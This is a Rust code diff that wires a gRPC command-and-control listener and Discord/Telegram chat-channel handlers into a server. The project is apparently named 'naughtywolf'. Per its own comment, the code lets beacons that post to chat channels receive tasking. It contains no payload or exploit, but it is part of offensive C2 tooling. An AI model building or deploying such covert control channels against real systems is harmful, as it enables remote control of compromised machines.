@@ -98,6 +98,35 @@ async fn serve(config: Config, pool: sqlx::SqlitePool) -> anyhow::Result<()> {
             }
         });
     }
+    if let Some(bind) = config.grpc_bind {
+        let grpc_repository = repository.clone();
+        let grpc_psk = c2_psk.clone();
+        tracing::info!(%bind, "portal grpc c2 listener up");
+        tokio::spawn(async move {
+            if let Err(error) =
+                naughtywolf::c2_grpc::serve(grpc_repository, grpc_psk, "grpc".to_owned(), bind)
+                    .await
+            {
+                tracing::error!(%error, "portal grpc listener stopped");
+            }
+        });
+    }
+    // Chat-platform channels: the server half of the Discord/Telegram callback
+    // loop. Without these a beacon posting to a channel is never tasked.
+    for (label, endpoint) in [
+        ("discord", config.discord_channel.clone()),
+        ("telegram", config.telegram_channel.clone()),
+    ] {
+        let Some(endpoint) = endpoint else { continue };
+        let channel = nw_profile::chat_channel::channel_from_endpoint(&endpoint)
+            .map_err(|e| anyhow::anyhow!("invalid {label} channel endpoint: {e}"))?;
+        let handler = naughtywolf::c2_chat::frame_handler(repository.clone(), c2_psk.clone());
+        tracing::info!(channel = label, "portal chat c2 channel up");
+        tokio::spawn(async move {
+            nw_profile::chat_channel::serve(channel, handler, std::time::Duration::from_secs(5))
+                .await;
+        });
+    }
     let listener = tokio::net::TcpListener::bind(config.bind).await?;
     tracing::info!(bind = %config.bind, "local standalone server listening");
     axum::serve(listener, app).await?;
